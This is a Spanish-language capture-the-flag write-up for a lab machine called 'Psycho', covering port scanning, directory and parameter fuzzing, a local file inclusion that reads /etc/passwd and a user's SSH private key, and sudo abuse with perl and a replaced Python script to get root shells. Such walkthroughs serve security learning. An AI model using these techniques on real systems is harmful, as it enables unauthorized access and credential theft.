---
description: '✍️ Autor: Luisillo_o🔍 Dificultad: Fácil  📅 Fecha de creación: 10/08/2024'
---

# Psycho

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea un presentación del CTF.

<figure><img src="../../.gitbook/assets/image (890).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el directorio `/assets` y contiene una imagen pero no es relevante. En el servidor web encontramos el siguiente mensaje: \[!] ERROR \[!]. Aprovechando este error y el hecho de que contamos con un archivo `index.php`, decidimos realizar un ataque de fuzzing en busca de un parámetro vulnerable.

```bash
wfuzz -c --hw 169 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=/etc/passwd
```

<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Vamos a comprobar si hay un **LFI**.

```bash
http://172.17.0.2/index.php?secret=/etc/passwd
```

<figure><img src="../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

Nos encontramos dos usuarios **luisillo** y **vaxei** pero realizando fuerza bruta no tenemos suerte por lo que probamos a coger el **id\_rsa** con **vaxei** tenemos suerte.

<figure><img src="../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>

La copiamos en nuestra máquina y le damos permisos.

```bash
chmod 600 id_rsa
```

Nos logueamos.

```bash
ssh -i id_rsa vaxei@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

Tenemos permisos **SUDO** con el usuario **luisillo** con **perl** revisamos esta [página](https://gtfobins.github.io/gtfobins/perl/).

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

<figure><img src="../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

Vemos que permisos **SUDO** tenemos para escalar.

<figure><img src="../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>

Borramos el archivo y creamos el mismo archivo pero con este contenido para que establezca una **shell**.

```bash
import os

# Ejecutar bash
os.system("/bin/bash")
```

Ejecutamos para escalar a **root**.

```bash
sudo -u root /usr/bin/python3 /opt/paw.py
```

<figure><img src="../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>
